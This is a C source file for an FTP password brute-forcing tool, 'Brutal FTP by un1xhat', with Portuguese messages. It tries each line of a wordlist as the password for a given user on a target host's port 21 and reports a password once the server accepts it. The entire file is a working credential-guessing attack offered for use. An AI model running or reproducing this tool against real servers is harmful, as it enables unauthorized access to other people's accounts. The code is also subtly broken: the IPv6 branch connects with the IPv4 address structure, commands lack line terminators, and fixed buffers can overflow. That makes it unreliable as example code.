#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define MAX 256
    struct sockaddr_in target;
    struct sockaddr_in6 target6;
    int main(int argc, char *argv[]){
		// argv[1] => ip; argv[2]=> user; argv[3] => txt; argv[4] => ipv
		char *ip = argv[1];
		char *user = argv[2];
		char *txt = argv[3];
		int ipv = atoi(argv[4]);
		char copyPass[MAX];
		char copyUser[MAX];
		char buf[MAX];
	    int status = 0;
		FILE *word;
		printf("=========================================\n");
		printf("===       Brutal FTP by un1xhat       ===\n");
		printf("=========================================\n");
	    	sleep(5);
		word = fopen(txt, "r");
		if(word == NULL){
		    perror("Open File Error");
		    exit(1);	
		}
		printf("Estamos trabalhando, vá tomar um café...\n");
		if(ipv == 4){
			while(fgets(buf, MAX, word) != NULL){
				memset(&target, 0, sizeof(target));
				target.sin_addr.s_addr = inet_addr(ip);	
				target.sin_family = AF_INET;
				target.sin_port = htons(21);
		    
				int sock = socket(AF_INET, SOCK_STREAM, 0);
				if(sock < 0){
					perror("Sock Error");	
				}
				int cnx = connect(sock, (struct sockaddr *)&target, sizeof(target));
				if(cnx < 0){
					perror("Connect Error");	
					exit(1);
				}
				strcpy(copyUser, "USER ");
				strcat(copyUser, user);
			
				strcpy(copyPass, "PASS ");
				strcat(copyPass, buf);
				printf("[!] - Testando pass: %s", buf);
				send(sock, copyUser, strlen(copyUser), 0);
				send(sock, copyPass, strlen(copyPass), 0);
				recv(sock, buf, MAX, 0);
				status = atoi(buf);
				if(status == 230){
					printf("Pass encontrada: %s", copyPass);
			        exit(0);
			    }
			    close(sock);
		    }
		    fclose(word);
	    }
	    
	    else if(ipv == 6){
			while(fgets(buf, MAX, word) != NULL){
				memset(&target6, 0, sizeof(target6));
				inet_pton(AF_INET6, ip, &target6.sin6_addr);	
				target6.sin6_family = AF_INET6;
				target6.sin6_port = htons(21);
		    
				int sock = socket(AF_INET6, SOCK_STREAM, 0);
				if(sock < 0){
					perror("Sock Error");	
				}
				int cnx = connect(sock, (struct sockaddr *)&target, sizeof(target));
				if(cnx < 0){
					perror("Connect Error");	
					exit(1);
				}
				strcpy(copyUser, "USER ");
				strcat(copyUser, user);
			
				strcpy(copyPass, "PASS ");
				strcat(copyPass, buf);
				printf("[!] - Testando pass: %s", buf);
				send(sock, copyUser, strlen(copyUser), 0);
				send(sock, copyPass, strlen(copyPass), 0);
				recv(sock, buf, MAX, 0);
				status = atoi(buf);
				if(status == 230){
					printf("Pass encontrada: %s", buf);
			        exit(0);
			    }
			    close(sock);
		    }
		    fclose(word);
	    }
	    
	    else{
		    printf("./brutalFtp <ip> <user> <pass> <IPv[4/6]>\n");	
		}
	    return 0;	
	}
